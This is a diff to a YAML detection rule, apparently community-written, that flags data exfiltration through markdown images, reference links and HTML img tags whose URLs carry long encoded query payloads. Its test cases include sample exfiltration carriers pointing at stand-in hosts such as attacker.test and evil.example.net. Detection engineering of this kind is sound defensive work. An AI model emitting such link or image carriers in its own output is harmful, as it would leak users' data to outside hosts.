@@ -39,7 +39,7 @@ purview:
     - id: Regex_md_image_exfil
       pattern: '!\[[^\]]*\]\(\s*https?://[^)\s]+[?#&][^)\s]*=[^)\s]{16,}\)'
     - id: Regex_md_reflink_exfil
-      pattern: '^\s*\[[^\]]+\]:\s*https?://[^\s]+[?#&][^\s]*=[^\s]{16,}'
+      pattern: '\[[^\]]+\]:\s*https?://[^\s]+[?#&][^\s]*=[^\s]{16,}'
     - id: Regex_html_img_exfil
       pattern: '(?i)<img\s+[^>]*src\s*=\s*["'']?https?://[^"''>\s]+[?#&][^"''>\s]*=[^"''>\s]{16,}'
   shared_keywords:
@@ -88,11 +88,18 @@ test_cases:
       description: Markdown image to external host with long base64-like query payload
     - value: '<img src="https://attacker.test/p?x=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo">'
       description: HTML img tag to external host with encoded payload
+    - value: '[ref]: https://evil.example.net/c?d=eyJzZWNyZXQiOiJsZWFrZWQtdmFsdWUtMTIzNDU2Nzg5In0'
+      description: Reference-style markdown link definition off-tenant with long encoded payload
   should_not_match:
     - value: '![logo](https://contoso.sharepoint.com/sites/team/logo.png)'
       description: SharePoint deep link (corporate host, no data payload)
     - value: '![pixel](https://analytics.example.com/t?id=42)'
       description: Analytics URL with short, non-data parameter
+false_positives:
+  - description: Legitimate markdown images or links to external CDNs or documentation hosts that carry long cache-busting or signed-URL query strings (e.g. AWS presigned URLs, CDN asset hashes) resembling encoded payloads.
+    mitigation: Maintain an allow-list of trusted asset/CDN hosts (extend Keyword_corporate_hosts) and require AI-context corroboration before raising confidence; the 65 regex-only tier is advisory.
+  - description: Security-research, training, or detection-engineering content that quotes EchoLeak-style exfiltration carriers verbatim as examples.
+    mitigation: Exclude documents containing example/test markers (example.com, PLACEHOLDER) via the existing TextMatchFilter and gate on AI-context markers absent in prose discussion.
 created: '2026-06-08'
 updated: '2026-06-08'
 author: testpattern-community
